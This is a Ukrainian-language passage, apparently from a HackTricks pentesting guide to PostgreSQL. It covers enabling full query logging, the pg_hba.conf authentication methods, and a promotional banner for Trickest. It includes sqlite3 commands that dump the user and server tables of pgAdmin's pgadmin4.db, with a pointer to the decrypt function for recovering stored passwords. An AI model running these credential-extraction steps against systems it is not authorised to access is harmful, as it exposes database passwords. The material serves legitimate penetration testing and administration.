У файлі _**postgresql.conf**_ ви можете увімкнути журнали postgresql, змінивши:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Тоді, **перезапустіть сервіс**.

### pgadmin

[pgadmin](https://www.pgadmin.org) є платформою для адміністрування та розробки для PostgreSQL.\
Ви можете знайти **паролі** всередині файлу _**pgadmin4.db**_\
Ви можете розшифрувати їх, використовуючи функцію _**decrypt**_ всередині скрипта: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

Аутентифікація клієнтів у PostgreSQL керується через конфігураційний файл під назвою **pg_hba.conf**. Цей файл містить серію записів, кожен з яких вказує тип з'єднання, діапазон IP-адрес клієнтів (якщо застосовно), назву бази даних, ім'я користувача та метод аутентифікації, який слід використовувати для відповідності з'єднанням. Перший запис, який відповідає типу з'єднання, адресі клієнта, запитуваній базі даних та імені користувача, використовується для аутентифікації. Немає резервного варіанту, якщо аутентифікація не вдалася. Якщо жоден запис не відповідає, доступ заборонено.

Доступні методи аутентифікації на основі паролів у pg_hba.conf - це **md5**, **crypt** та **password**. Ці методи відрізняються тим, як передається пароль: MD5-хешований, crypt-зашифрований або у відкритому тексті. Важливо зазначити, що метод crypt не може бути використаний з паролями, які були зашифровані в pg_authid.

{{#include ../banners/hacktricks-training.md}}

<figure><img src="../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Використовуйте [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=pentesting-postgresql), щоб легко створювати та **автоматизувати робочі процеси**, які підтримуються **найсучаснішими** інструментами спільноти.\
Отримайте доступ сьогодні:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pentesting-postgresql" %}
